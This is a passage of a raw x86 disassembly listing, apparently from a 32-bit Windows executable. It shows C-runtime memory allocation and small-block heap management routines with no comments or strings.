  42498d:	push   DWORD PTR [ebp+0xc]
  424990:	push   DWORD PTR [ebp+0x8]
  424993:	call   eax
  424995:	mov    DWORD PTR [ebp-0x1c],eax
  424998:	jmp    0x4249be
  42499a:	mov    eax,DWORD PTR [ebp-0x14]
  42499d:	mov    eax,DWORD PTR [eax]
  42499f:	mov    eax,DWORD PTR [eax]
  4249a1:	mov    DWORD PTR [ebp-0x20],eax
  4249a4:	xor    eax,eax
  4249a6:	inc    eax
  4249a7:	ret    
  4249a8:	mov    esp,DWORD PTR [ebp-0x18]
  4249ab:	cmp    DWORD PTR [ebp-0x20],0xc0000017
  4249b2:	jne    0x4249bc
  4249b4:	push   0x8
  4249b6:	call   DWORD PTR ds:0x42806c
  4249bc:	xor    eax,eax
  4249be:	or     DWORD PTR [ebp-0x4],0xffffffff
  4249c2:	call   0x4238e3
  4249c7:	ret    
  4249c8:	push   0x10
  4249ca:	push   0x4285d0
  4249cf:	call   0x4238a8
  4249d4:	mov    esi,DWORD PTR [ebp+0x8]
  4249d7:	imul   esi,DWORD PTR [ebp+0xc]
  4249db:	mov    DWORD PTR [ebp-0x1c],esi
  4249de:	test   esi,esi
  4249e0:	jne    0x4249e3
  4249e2:	inc    esi
  4249e3:	xor    edi,edi
  4249e5:	mov    DWORD PTR [ebp-0x20],edi
  4249e8:	cmp    esi,0xffffffe0
  4249eb:	ja     0x424a52
  4249ed:	cmp    DWORD PTR ds:0x45d144,0x3
  4249f4:	jne    0x424a3d
  4249f6:	add    esi,0xf
  4249f9:	and    esi,0xfffffff0
  4249fc:	mov    DWORD PTR [ebp+0xc],esi
  4249ff:	mov    ebx,DWORD PTR [ebp-0x1c]
  424a02:	cmp    ebx,DWORD PTR ds:0x45cf04
  424a08:	ja     0x424a3d
  424a0a:	push   0x4
  424a0c:	call   0x423a6f
  424a11:	pop    ecx
  424a12:	and    DWORD PTR [ebp-0x4],edi
  424a15:	push   ebx
  424a16:	call   0x425471
  424a1b:	pop    ecx
  424a1c:	mov    DWORD PTR [ebp-0x20],eax
  424a1f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424a23:	call   0x424a72
  424a28:	mov    edi,DWORD PTR [ebp-0x20]
  424a2b:	test   edi,edi
  424a2d:	je     0x424a41
  424a2f:	push   DWORD PTR [ebp-0x1c]
  424a32:	push   0x0
  424a34:	push   edi
  424a35:	call   0x4261b0
  424a3a:	add    esp,0xc
  424a3d:	test   edi,edi
  424a3f:	jne    0x424a7b
  424a41:	push   esi
  424a42:	push   0x8
  424a44:	push   DWORD PTR ds:0x45d140
  424a4a:	call   DWORD PTR ds:0x4280a8
  424a50:	mov    edi,eax
  424a52:	test   edi,edi
  424a54:	jne    0x424a7b
  424a56:	cmp    DWORD PTR ds:0x45cdc8,edi
  424a5c:	je     0x424a7b
  424a5e:	push   esi
  424a5f:	call   0x426192
  424a64:	pop    ecx
  424a65:	test   eax,eax
  424a67:	jne    0x4249e3
  424a6d:	jmp    0x424a7d
  424a6f:	mov    esi,DWORD PTR [ebp+0xc]
  424a72:	push   0x4
  424a74:	call   0x4239db
  424a79:	pop    ecx
  424a7a:	ret    
  424a7b:	mov    eax,edi
  424a7d:	call   0x4238e3
  424a82:	ret    
  424a83:	push   esi
  424a84:	mov    esi,DWORD PTR [esp+0x8]
  424a88:	mov    eax,DWORD PTR [esi+0x3c]
  424a8b:	push   edi
  424a8c:	xor    edi,edi
  424a8e:	cmp    eax,DWORD PTR ds:0x45cdd4
  424a94:	je     0x424af9
  424a96:	cmp    eax,edi
  424a98:	je     0x424af9
  424a9a:	mov    eax,DWORD PTR [esi+0x2c]
  424a9d:	cmp    DWORD PTR [eax],edi
  424a9f:	jne    0x424af9
  424aa1:	mov    eax,DWORD PTR [esi+0x34]
  424aa4:	cmp    eax,edi
  424aa6:	je     0x424ac4
  424aa8:	cmp    DWORD PTR [eax],edi
  424aaa:	jne    0x424ac4
  424aac:	cmp    eax,DWORD PTR ds:0x45cef0
  424ab2:	je     0x424ac4
  424ab4:	push   eax
  424ab5:	call   0x4244ba
  424aba:	push   DWORD PTR [esi+0x3c]
  424abd:	call   0x4263ff
  424ac2:	pop    ecx
  424ac3:	pop    ecx
  424ac4:	mov    eax,DWORD PTR [esi+0x30]
  424ac7:	cmp    eax,edi
  424ac9:	je     0x424ae7
  424acb:	cmp    DWORD PTR [eax],edi
  424acd:	jne    0x424ae7
  424acf:	cmp    eax,DWORD PTR ds:0x45cef4
  424ad5:	je     0x424ae7
  424ad7:	push   eax
  424ad8:	call   0x4244ba
  424add:	push   DWORD PTR [esi+0x3c]
  424ae0:	call   0x4263a0
  424ae5:	pop    ecx
  424ae6:	pop    ecx
  424ae7:	push   DWORD PTR [esi+0x2c]
  424aea:	call   0x4244ba
  424aef:	push   DWORD PTR [esi+0x3c]
  424af2:	call   0x4244ba
  424af7:	pop    ecx
  424af8:	pop    ecx
  424af9:	mov    eax,DWORD PTR [esi+0x40]
  424afc:	cmp    eax,DWORD PTR ds:0x45ceec
  424b02:	je     0x424b1c
  424b04:	cmp    eax,edi
  424b06:	je     0x424b1c
  424b08:	cmp    DWORD PTR [eax],edi
  424b0a:	jne    0x424b1c
  424b0c:	push   eax
  424b0d:	call   0x4244ba
  424b12:	push   DWORD PTR [esi+0x44]
  424b15:	call   0x4244ba
  424b1a:	pop    ecx
  424b1b:	pop    ecx
  424b1c:	mov    eax,DWORD PTR [esi+0x50]
  424b1f:	cmp    eax,DWORD PTR ds:0x45cdd0
  424b25:	je     0x424b43
  424b27:	cmp    eax,edi
  424b29:	je     0x424b43
  424b2b:	cmp    DWORD PTR [eax+0xb4],edi
  424b31:	jne    0x424b43
  424b33:	push   eax
  424b34:	call   0x426210
  424b39:	push   DWORD PTR [esi+0x50]
  424b3c:	call   0x4244ba
  424b41:	pop    ecx
  424b42:	pop    ecx
  424b43:	push   esi
  424b44:	call   0x4244ba
  424b49:	pop    ecx
  424b4a:	pop    edi
  424b4b:	pop    esi
  424b4c:	ret    
  424b4d:	push   esi
  424b4e:	call   0x42375d
  424b53:	mov    esi,eax
  424b55:	mov    eax,DWORD PTR [esi+0x64]
  424b58:	cmp    eax,DWORD PTR ds:0x45c58c
  424b5e:	je     0x424c0a
  424b64:	test   eax,eax
  424b66:	je     0x424b97
  424b68:	mov    ecx,DWORD PTR [eax+0x2c]
  424b6b:	dec    DWORD PTR [eax]
  424b6d:	test   ecx,ecx
  424b6f:	je     0x424b73
  424b71:	dec    DWORD PTR [ecx]
  424b73:	mov    ecx,DWORD PTR [eax+0x34]
  424b76:	test   ecx,ecx
  424b78:	je     0x424b7c
  424b7a:	dec    DWORD PTR [ecx]
  424b7c:	mov    ecx,DWORD PTR [eax+0x30]
  424b7f:	test   ecx,ecx
  424b81:	je     0x424b85
  424b83:	dec    DWORD PTR [ecx]
  424b85:	mov    ecx,DWORD PTR [eax+0x40]
  424b88:	test   ecx,ecx
  424b8a:	je     0x424b8e
  424b8c:	dec    DWORD PTR [ecx]
  424b8e:	mov    ecx,DWORD PTR [eax+0x4c]
  424b91:	dec    DWORD PTR [ecx+0xb4]
  424b97:	mov    ecx,DWORD PTR ds:0x45c58c
  424b9d:	mov    DWORD PTR [esi+0x64],ecx
  424ba0:	mov    ecx,DWORD PTR ds:0x45c58c
  424ba6:	inc    DWORD PTR [ecx]
  424ba8:	mov    ecx,DWORD PTR ds:0x45c58c
  424bae:	mov    ecx,DWORD PTR [ecx+0x2c]
  424bb1:	test   ecx,ecx
  424bb3:	je     0x424bb7
  424bb5:	inc    DWORD PTR [ecx]
  424bb7:	mov    ecx,DWORD PTR ds:0x45c58c
  424bbd:	mov    ecx,DWORD PTR [ecx+0x34]
  424bc0:	test   ecx,ecx
  424bc2:	je     0x424bc6
  424bc4:	inc    DWORD PTR [ecx]
  424bc6:	mov    ecx,DWORD PTR ds:0x45c58c
  424bcc:	mov    ecx,DWORD PTR [ecx+0x30]
  424bcf:	test   ecx,ecx
  424bd1:	je     0x424bd5
  424bd3:	inc    DWORD PTR [ecx]
  424bd5:	mov    ecx,DWORD PTR ds:0x45c58c
  424bdb:	mov    ecx,DWORD PTR [ecx+0x40]
  424bde:	test   ecx,ecx
  424be0:	je     0x424be4
  424be2:	inc    DWORD PTR [ecx]
  424be4:	mov    ecx,DWORD PTR ds:0x45c58c
  424bea:	mov    ecx,DWORD PTR [ecx+0x4c]
  424bed:	inc    DWORD PTR [ecx+0xb4]
  424bf3:	test   eax,eax
  424bf5:	je     0x424c0a
  424bf7:	cmp    DWORD PTR [eax],0x0
  424bfa:	jne    0x424c0a
  424bfc:	cmp    eax,0x45c538
  424c01:	je     0x424c0a
  424c03:	push   eax
  424c04:	call   0x424a83
  424c09:	pop    ecx
  424c0a:	mov    eax,DWORD PTR [esi+0x64]
  424c0d:	pop    esi
  424c0e:	ret    
  424c0f:	push   0xc
  424c11:	push   0x428760
  424c16:	call   0x4238a8
  424c1b:	push   0xc
  424c1d:	call   0x423a6f
  424c22:	pop    ecx
  424c23:	and    DWORD PTR [ebp-0x4],0x0
  424c27:	call   0x424b4d
  424c2c:	mov    DWORD PTR [ebp-0x1c],eax
  424c2f:	or     DWORD PTR [ebp-0x4],0xffffffff
  424c33:	call   0x424c41
  424c38:	mov    eax,DWORD PTR [ebp-0x1c]
  424c3b:	call   0x4238e3
  424c40:	ret    
  424c41:	push   0xc
  424c43:	call   0x4239db
  424c48:	pop    ecx
  424c49:	ret    
  424c4a:	push   0x140
  424c4f:	push   0x0
  424c51:	push   DWORD PTR ds:0x45d140
  424c57:	call   DWORD PTR ds:0x4280a8
  424c5d:	test   eax,eax
  424c5f:	mov    ds:0x45cf00,eax
  424c64:	jne    0x424c67
  424c66:	ret    
  424c67:	mov    ecx,DWORD PTR [esp+0x4]
  424c6b:	and    DWORD PTR ds:0x45cef8,0x0
  424c72:	and    DWORD PTR ds:0x45cefc,0x0
  424c79:	mov    ds:0x45cf08,eax
  424c7e:	xor    eax,eax
  424c80:	mov    DWORD PTR ds:0x45cf04,ecx
  424c86:	mov    DWORD PTR ds:0x45cf0c,0x10
  424c90:	inc    eax
  424c91:	ret    
  424c92:	mov    eax,ds:0x45cefc
  424c97:	lea    ecx,[eax+eax*4]
  424c9a:	mov    eax,ds:0x45cf00
  424c9f:	lea    ecx,[eax+ecx*4]
  424ca2:	jmp    0x424cb6
  424ca4:	mov    edx,DWORD PTR [esp+0x4]
  424ca8:	sub    edx,DWORD PTR [eax+0xc]
  424cab:	cmp    edx,0x100000
  424cb1:	jb     0x424cbc
  424cb3:	add    eax,0x14
  424cb6:	cmp    eax,ecx
  424cb8:	jb     0x424ca4
  424cba:	xor    eax,eax
  424cbc:	ret    
  424cbd:	push   ebp
  424cbe:	mov    ebp,esp
  424cc0:	sub    esp,0x10
  424cc3:	mov    ecx,DWORD PTR [ebp+0x8]
  424cc6:	mov    eax,DWORD PTR [ecx+0x10]
  424cc9:	push   esi
  424cca:	mov    esi,DWORD PTR [ebp+0xc]
  424ccd:	push   edi
  424cce:	mov    edi,esi
  424cd0:	sub    edi,DWORD PTR [ecx+0xc]
  424cd3:	add    esi,0xfffffffc
  424cd6:	shr    edi,0xf
  424cd9:	mov    ecx,edi
  424cdb:	imul   ecx,ecx,0x204
  424ce1:	lea    ecx,[ecx+eax*1+0x144]
  424ce8:	mov    DWORD PTR [ebp-0x10],ecx
  424ceb:	mov    ecx,DWORD PTR [esi]
  424ced:	dec    ecx
  424cee:	test   cl,0x1
  424cf1:	mov    DWORD PTR [ebp-0x4],ecx
  424cf4:	jne    0x424fd1
  424cfa:	push   ebx
  424cfb:	lea    ebx,[ecx+esi*1]
  424cfe:	mov    edx,DWORD PTR [ebx]
  424d00:	mov    DWORD PTR [ebp-0xc],edx
  424d03:	mov    edx,DWORD PTR [esi-0x4]
  424d06:	mov    DWORD PTR [ebp-0x8],edx
  424d09:	mov    edx,DWORD PTR [ebp-0xc]
  424d0c:	test   dl,0x1
  424d0f:	mov    DWORD PTR [ebp+0xc],ebx
  424d12:	jne    0x424d88
  424d14:	sar    edx,0x4
  424d17:	dec    edx
  424d18:	cmp    edx,0x3f
  424d1b:	jbe    0x424d20
  424d1d:	push   0x3f
  424d1f:	pop    edx
  424d20:	mov    ecx,DWORD PTR [ebx+0x4]
  424d23:	cmp    ecx,DWORD PTR [ebx+0x8]
  424d26:	jne    0x424d6a
  424d28:	cmp    edx,0x20
  424d2b:	mov    ebx,0x80000000
  424d30:	jae    0x424d4b
  424d32:	mov    ecx,edx
  424d34:	shr    ebx,cl
  424d36:	lea    ecx,[edx+eax*1+0x4]
  424d3a:	not    ebx
  424d3c:	and    DWORD PTR [eax+edi*4+0x44],ebx
  424d40:	dec    BYTE PTR [ecx]
  424d42:	jne    0x424d67
  424d44:	mov    ecx,DWORD PTR [ebp+0x8]
  424d47:	and    DWORD PTR [ecx],ebx
  424d49:	jmp    0x424d67
  424d4b:	lea    ecx,[edx-0x20]
  424d4e:	shr    ebx,cl
  424d50:	lea    ecx,[edx+eax*1+0x4]
  424d54:	not    ebx
  424d56:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  424d5d:	dec    BYTE PTR [ecx]
  424d5f:	jne    0x424d67
  424d61:	mov    ecx,DWORD PTR [ebp+0x8]
  424d64:	and    DWORD PTR [ecx+0x4],ebx
  424d67:	mov    ebx,DWORD PTR [ebp+0xc]
  424d6a:	mov    edx,DWORD PTR [ebx+0x8]
  424d6d:	mov    ebx,DWORD PTR [ebx+0x4]
  424d70:	mov    ecx,DWORD PTR [ebp-0x4]
  424d73:	add    ecx,DWORD PTR [ebp-0xc]
  424d76:	mov    DWORD PTR [edx+0x4],ebx
  424d79:	mov    edx,DWORD PTR [ebp+0xc]
  424d7c:	mov    ebx,DWORD PTR [edx+0x4]
  424d7f:	mov    edx,DWORD PTR [edx+0x8]
  424d82:	mov    DWORD PTR [ebx+0x8],edx
  424d85:	mov    DWORD PTR [ebp-0x4],ecx
  424d88:	mov    edx,ecx
  424d8a:	sar    edx,0x4
  424d8d:	dec    edx
  424d8e:	cmp    edx,0x3f
  424d91:	jbe    0x424d96
  424d93:	push   0x3f
  424d95:	pop    edx
  424d96:	mov    ebx,DWORD PTR [ebp-0x8]
  424d99:	and    ebx,0x1
  424d9c:	mov    DWORD PTR [ebp-0xc],ebx
  424d9f:	jne    0x424e34
  424da5:	sub    esi,DWORD PTR [ebp-0x8]
  424da8:	mov    ebx,DWORD PTR [ebp-0x8]
  424dab:	sar    ebx,0x4
  424dae:	push   0x3f
  424db0:	mov    DWORD PTR [ebp+0xc],esi
  424db3:	dec    ebx
  424db4:	pop    esi
  424db5:	cmp    ebx,esi
  424db7:	jbe    0x424dbb
  424db9:	mov    ebx,esi
  424dbb:	add    ecx,DWORD PTR [ebp-0x8]
  424dbe:	mov    edx,ecx
  424dc0:	sar    edx,0x4
  424dc3:	dec    edx
  424dc4:	cmp    edx,esi
  424dc6:	mov    DWORD PTR [ebp-0x4],ecx
  424dc9:	jbe    0x424dcd
  424dcb:	mov    edx,esi
  424dcd:	cmp    ebx,edx
  424dcf:	je     0x424e2f
  424dd1:	mov    ecx,DWORD PTR [ebp+0xc]
  424dd4:	mov    esi,DWORD PTR [ecx+0x4]
  424dd7:	cmp    esi,DWORD PTR [ecx+0x8]
  424dda:	jne    0x424e17
  424ddc:	cmp    ebx,0x20
  424ddf:	mov    esi,0x80000000
  424de4:	jae    0x424dfd
  424de6:	mov    ecx,ebx
  424de8:	shr    esi,cl
  424dea:	not    esi
  424dec:	and    DWORD PTR [eax+edi*4+0x44],esi
  424df0:	dec    BYTE PTR [ebx+eax*1+0x4]
  424df4:	jne    0x424e17
  424df6:	mov    ecx,DWORD PTR [ebp+0x8]
  424df9:	and    DWORD PTR [ecx],esi
  424dfb:	jmp    0x424e17
  424dfd:	lea    ecx,[ebx-0x20]
  424e00:	shr    esi,cl
  424e02:	not    esi
  424e04:	and    DWORD PTR [eax+edi*4+0xc4],esi
  424e0b:	dec    BYTE PTR [ebx+eax*1+0x4]
  424e0f:	jne    0x424e17
  424e11:	mov    ecx,DWORD PTR [ebp+0x8]
  424e14:	and    DWORD PTR [ecx+0x4],esi
  424e17:	mov    ecx,DWORD PTR [ebp+0xc]
  424e1a:	mov    esi,DWORD PTR [ecx+0x8]
  424e1d:	mov    ecx,DWORD PTR [ecx+0x4]
  424e20:	mov    DWORD PTR [esi+0x4],ecx
  424e23:	mov    ecx,DWORD PTR [ebp+0xc]
  424e26:	mov    esi,DWORD PTR [ecx+0x4]
  424e29:	mov    ecx,DWORD PTR [ecx+0x8]
  424e2c:	mov    DWORD PTR [esi+0x8],ecx
  424e2f:	mov    esi,DWORD PTR [ebp+0xc]
  424e32:	jmp    0x424e37
  424e34:	mov    ebx,DWORD PTR [ebp+0x8]
  424e37:	cmp    DWORD PTR [ebp-0xc],0x0
  424e3b:	jne    0x424e45
  424e3d:	cmp    ebx,edx
  424e3f:	je     0x424ec5
  424e45:	mov    ecx,DWORD PTR [ebp-0x10]
  424e48:	lea    ecx,[ecx+edx*8]
  424e4b:	mov    ebx,DWORD PTR [ecx+0x4]
  424e4e:	mov    DWORD PTR [esi+0x8],ecx
  424e51:	mov    DWORD PTR [esi+0x4],ebx
  424e54:	mov    DWORD PTR [ecx+0x4],esi
  424e57:	mov    ecx,DWORD PTR [esi+0x4]
  424e5a:	mov    DWORD PTR [ecx+0x8],esi
  424e5d:	mov    ecx,DWORD PTR [esi+0x4]
  424e60:	cmp    ecx,DWORD PTR [esi+0x8]
  424e63:	jne    0x424ec5
  424e65:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  424e69:	mov    BYTE PTR [ebp+0xf],cl
  424e6c:	inc    cl
  424e6e:	cmp    edx,0x20
  424e71:	mov    BYTE PTR [edx+eax*1+0x4],cl
  424e75:	jae    0x424e9c
  424e77:	cmp    BYTE PTR [ebp+0xf],0x0
  424e7b:	jne    0x424e8b
  424e7d:	mov    ecx,edx
  424e7f:	mov    ebx,0x80000000
  424e84:	shr    ebx,cl
  424e86:	mov    ecx,DWORD PTR [ebp+0x8]
  424e89:	or     DWORD PTR [ecx],ebx
  424e8b:	mov    ebx,0x80000000
  424e90:	mov    ecx,edx
  424e92:	shr    ebx,cl
  424e94:	lea    eax,[eax+edi*4+0x44]
  424e98:	or     DWORD PTR [eax],ebx
  424e9a:	jmp    0x424ec5
  424e9c:	cmp    BYTE PTR [ebp+0xf],0x0
  424ea0:	jne    0x424eb2
  424ea2:	lea    ecx,[edx-0x20]
  424ea5:	mov    ebx,0x80000000
  424eaa:	shr    ebx,cl
  424eac:	mov    ecx,DWORD PTR [ebp+0x8]
  424eaf:	or     DWORD PTR [ecx+0x4],ebx
  424eb2:	lea    ecx,[edx-0x20]
  424eb5:	mov    edx,0x80000000
  424eba:	shr    edx,cl
  424ebc:	lea    eax,[eax+edi*4+0xc4]
  424ec3:	or     DWORD PTR [eax],edx
  424ec5:	mov    eax,DWORD PTR [ebp-0x4]
  424ec8:	mov    DWORD PTR [esi],eax
  424eca:	mov    DWORD PTR [eax+esi*1-0x4],eax
  424ece:	mov    eax,DWORD PTR [ebp-0x10]
  424ed1:	dec    DWORD PTR [eax]
  424ed3:	jne    0x424fd0
  424ed9:	mov    eax,ds:0x45cef8
  424ede:	test   eax,eax
  424ee0:	je     0x424fc2
  424ee6:	mov    ecx,DWORD PTR ds:0x45cf10
  424eec:	mov    esi,DWORD PTR ds:0x428088
  424ef2:	push   0x4000
  424ef7:	shl    ecx,0xf
  424efa:	add    ecx,DWORD PTR [eax+0xc]
  424efd:	mov    ebx,0x8000
  424f02:	push   ebx
  424f03:	push   ecx
  424f04:	call   esi
  424f06:	mov    ecx,DWORD PTR ds:0x45cf10
  424f0c:	mov    eax,ds:0x45cef8
  424f11:	mov    edx,0x80000000
  424f16:	shr    edx,cl
  424f18:	or     DWORD PTR [eax+0x8],edx
  424f1b:	mov    eax,ds:0x45cef8
  424f20:	mov    eax,DWORD PTR [eax+0x10]
  424f23:	mov    ecx,DWORD PTR ds:0x45cf10
  424f29:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  424f31:	mov    eax,ds:0x45cef8
  424f36:	mov    eax,DWORD PTR [eax+0x10]
  424f39:	dec    BYTE PTR [eax+0x43]
  424f3c:	mov    eax,ds:0x45cef8
  424f41:	mov    ecx,DWORD PTR [eax+0x10]
  424f44:	cmp    BYTE PTR [ecx+0x43],0x0
  424f48:	jne    0x424f53
  424f4a:	and    DWORD PTR [eax+0x4],0xfffffffe
  424f4e:	mov    eax,ds:0x45cef8
  424f53:	cmp    DWORD PTR [eax+0x8],0xffffffff
  424f57:	jne    0x424fc2
  424f59:	push   ebx
  424f5a:	push   0x0
  424f5c:	push   DWORD PTR [eax+0xc]
  424f5f:	call   esi
  424f61:	mov    eax,ds:0x45cef8
  424f66:	push   DWORD PTR [eax+0x10]
  424f69:	push   0x0
  424f6b:	push   DWORD PTR ds:0x45d140
  424f71:	call   DWORD PTR ds:0x42808c
  424f77:	mov    eax,ds:0x45cefc
  424f7c:	mov    edx,DWORD PTR ds:0x45cf00
  424f82:	lea    eax,[eax+eax*4]
  424f85:	shl    eax,0x2
  424f88:	mov    ecx,eax
  424f8a:	mov    eax,ds:0x45cef8
  424f8f:	sub    ecx,eax
  424f91:	lea    ecx,[ecx+edx*1-0x14]
  424f95:	push   ecx
  424f96:	lea    ecx,[eax+0x14]
  424f99:	push   ecx
  424f9a:	push   eax
  424f9b:	call   0x4267f0
  424fa0:	mov    eax,DWORD PTR [ebp+0x8]
  424fa3:	add    esp,0xc
  424fa6:	dec    DWORD PTR ds:0x45cefc
  424fac:	cmp    eax,DWORD PTR ds:0x45cef8
  424fb2:	jbe    0x424fb8
  424fb4:	sub    DWORD PTR [ebp+0x8],0x14
  424fb8:	mov    eax,ds:0x45cf00
  424fbd:	mov    ds:0x45cf08,eax
  424fc2:	mov    eax,DWORD PTR [ebp+0x8]
  424fc5:	mov    ds:0x45cef8,eax
  424fca:	mov    DWORD PTR ds:0x45cf10,edi
  424fd0:	pop    ebx
  424fd1:	pop    edi
  424fd2:	pop    esi
  424fd3:	leave  
  424fd4:	ret    
  424fd5:	mov    eax,ds:0x45cefc
  424fda:	mov    ecx,DWORD PTR ds:0x45cf0c
  424fe0:	push   edi
  424fe1:	xor    edi,edi
  424fe3:	cmp    eax,ecx
  424fe5:	jne    0x42501b
  424fe7:	lea    eax,[ecx+ecx*4+0x50]
  424feb:	shl    eax,0x2
  424fee:	push   eax
  424fef:	push   DWORD PTR ds:0x45cf00
  424ff5:	push   edi
  424ff6:	push   DWORD PTR ds:0x45d140
  424ffc:	call   DWORD PTR ds:0x4280b4
  425002:	cmp    eax,edi
  425004:	jne    0x42500a
  425006:	xor    eax,eax
  425008:	pop    edi
  425009:	ret    
  42500a:	add    DWORD PTR ds:0x45cf0c,0x10
  425011:	mov    ds:0x45cf00,eax
  425016:	mov    eax,ds:0x45cefc
  42501b:	mov    ecx,DWORD PTR ds:0x45cf00
  425021:	push   esi
  425022:	push   0x41c4
  425027:	push   0x8
  425029:	push   DWORD PTR ds:0x45d140
  42502f:	lea    eax,[eax+eax*4]
  425032:	lea    esi,[ecx+eax*4]
  425035:	call   DWORD PTR ds:0x4280a8
  42503b:	cmp    eax,edi
  42503d:	mov    DWORD PTR [esi+0x10],eax
  425040:	jne    0x425046
  425042:	xor    eax,eax
  425044:	jmp    0x425089
  425046:	push   0x4
  425048:	push   0x2000
  42504d:	push   0x100000
  425052:	push   edi
  425053:	call   DWORD PTR ds:0x4280b0
  425059:	cmp    eax,edi
  42505b:	mov    DWORD PTR [esi+0xc],eax
  42505e:	jne    0x425072
  425060:	push   DWORD PTR [esi+0x10]
  425063:	push   edi
  425064:	push   DWORD PTR ds:0x45d140
  42506a:	call   DWORD PTR ds:0x42808c
  425070:	jmp    0x425042
  425072:	or     DWORD PTR [esi+0x8],0xffffffff
  425076:	mov    DWORD PTR [esi],edi
  425078:	mov    DWORD PTR [esi+0x4],edi
  42507b:	inc    DWORD PTR ds:0x45cefc
  425081:	mov    eax,DWORD PTR [esi+0x10]
  425084:	or     DWORD PTR [eax],0xffffffff
  425087:	mov    eax,esi
  425089:	pop    esi
  42508a:	pop    edi
  42508b:	ret    
  42508c:	push   ebp
  42508d:	mov    ebp,esp
  42508f:	push   ecx
  425090:	push   ecx
  425091:	mov    ecx,DWORD PTR [ebp+0x8]
  425094:	mov    eax,DWORD PTR [ecx+0x8]
  425097:	push   ebx
  425098:	push   esi
  425099:	mov    esi,DWORD PTR [ecx+0x10]
  42509c:	push   edi
  42509d:	xor    ebx,ebx
  42509f:	jmp    0x4250a4
  4250a1:	shl    eax,1
  4250a3:	inc    ebx
  4250a4:	test   eax,eax
  4250a6:	jge    0x4250a1
  4250a8:	mov    eax,ebx
  4250aa:	imul   eax,eax,0x204
  4250b0:	lea    eax,[eax+esi*1+0x144]
  4250b7:	push   0x3f
  4250b9:	mov    DWORD PTR [ebp-0x8],eax
  4250bc:	pop    edx
  4250bd:	mov    DWORD PTR [eax+0x8],eax
  4250c0:	mov    DWORD PTR [eax+0x4],eax
  4250c3:	add    eax,0x8
  4250c6:	dec    edx
  4250c7:	jne    0x4250bd
  4250c9:	push   0x4
  4250cb:	mov    edi,ebx
  4250cd:	push   0x1000
  4250d2:	shl    edi,0xf
  4250d5:	add    edi,DWORD PTR [ecx+0xc]
  4250d8:	push   0x8000
  4250dd:	push   edi
  4250de:	call   DWORD PTR ds:0x4280b0
  4250e4:	test   eax,eax
  4250e6:	jne    0x4250f0
  4250e8:	or     eax,0xffffffff
  4250eb:	jmp    0x42518d
  4250f0:	lea    edx,[edi+0x7000]
  4250f6:	cmp    edi,edx
  4250f8:	mov    DWORD PTR [ebp-0x4],edx
  4250fb:	ja     0x425140
  4250fd:	mov    ecx,edx
  4250ff:	sub    ecx,edi
  425101:	shr    ecx,0xc
  425104:	lea    eax,[edi+0x10]
  425107:	inc    ecx
  425108:	or     DWORD PTR [eax-0x8],0xffffffff
  42510c:	or     DWORD PTR [eax+0xfec],0xffffffff
  425113:	lea    edx,[eax+0xffc]
  425119:	mov    DWORD PTR [eax],edx
  42511b:	lea    edx,[eax-0x1004]
  425121:	mov    DWORD PTR [eax-0x4],0xff0
  425128:	mov    DWORD PTR [eax+0x4],edx
  42512b:	mov    DWORD PTR [eax+0xfe8],0xff0
  425135:	add    eax,0x1000
  42513a:	dec    ecx
  42513b:	jne    0x425108
  42513d:	mov    edx,DWORD PTR [ebp-0x4]
  425140:	mov    eax,DWORD PTR [ebp-0x8]
  425143:	add    eax,0x1f8
  425148:	lea    ecx,[edi+0xc]
  42514b:	mov    DWORD PTR [eax+0x4],ecx
  42514e:	mov    DWORD PTR [ecx+0x8],eax
  425151:	lea    ecx,[edx+0xc]
  425154:	mov    DWORD PTR [eax+0x8],ecx
  425157:	mov    DWORD PTR [ecx+0x4],eax
  42515a:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  42515f:	xor    edi,edi
  425161:	inc    edi
  425162:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  425169:	mov    al,BYTE PTR [esi+0x43]
  42516c:	mov    cl,al
  42516e:	inc    cl
  425170:	test   al,al
  425172:	mov    eax,DWORD PTR [ebp+0x8]
  425175:	mov    BYTE PTR [esi+0x43],cl
  425178:	jne    0x42517d
  42517a:	or     DWORD PTR [eax+0x4],edi
  42517d:	mov    edx,0x80000000
  425182:	mov    ecx,ebx
  425184:	shr    edx,cl
  425186:	not    edx
  425188:	and    DWORD PTR [eax+0x8],edx
  42518b:	mov    eax,ebx
  42518d:	pop    edi
  42518e:	pop    esi
  42518f:	pop    ebx
  425190:	leave  
  425191:	ret    
  425192:	push   ebp
  425193:	mov    ebp,esp
  425195:	sub    esp,0xc
  425198:	mov    ecx,DWORD PTR [ebp+0x8]
  42519b:	mov    eax,DWORD PTR [ecx+0x10]
  42519e:	push   ebx
  42519f:	push   esi
  4251a0:	mov    esi,DWORD PTR [ebp+0x10]
  4251a3:	push   edi
  4251a4:	mov    edi,DWORD PTR [ebp+0xc]
  4251a7:	mov    edx,edi
  4251a9:	sub    edx,DWORD PTR [ecx+0xc]
  4251ac:	add    esi,0x17
  4251af:	shr    edx,0xf
  4251b2:	mov    ecx,edx
  4251b4:	imul   ecx,ecx,0x204
  4251ba:	lea    ecx,[ecx+eax*1+0x144]
  4251c1:	mov    DWORD PTR [ebp-0xc],ecx
  4251c4:	mov    ecx,DWORD PTR [edi-0x4]
  4251c7:	and    esi,0xfffffff0
  4251ca:	dec    ecx
  4251cb:	cmp    esi,ecx
  4251cd:	lea    edi,[ecx+edi*1-0x4]
  4251d1:	mov    ebx,DWORD PTR [edi]
  4251d3:	mov    DWORD PTR [ebp+0x10],ecx
  4251d6:	mov    DWORD PTR [ebp-0x4],ebx
  4251d9:	jle    0x425334
  4251df:	test   bl,0x1
  4251e2:	jne    0x42532d
  4251e8:	add    ebx,ecx
  4251ea:	cmp    esi,ebx
  4251ec:	jg     0x42532d
  4251f2:	mov    ecx,DWORD PTR [ebp-0x4]
  4251f5:	sar    ecx,0x4
  4251f8:	dec    ecx
  4251f9:	cmp    ecx,0x3f
  4251fc:	mov    DWORD PTR [ebp-0x8],ecx
  4251ff:	jbe    0x425207
  425201:	push   0x3f
  425203:	pop    ecx
  425204:	mov    DWORD PTR [ebp-0x8],ecx
  425207:	mov    ebx,DWORD PTR [edi+0x4]
  42520a:	cmp    ebx,DWORD PTR [edi+0x8]
  42520d:	jne    0x425252
  42520f:	cmp    ecx,0x20
  425212:	mov    ebx,0x80000000
  425217:	jae    0x425233
  425219:	shr    ebx,cl
  42521b:	mov    ecx,DWORD PTR [ebp-0x8]
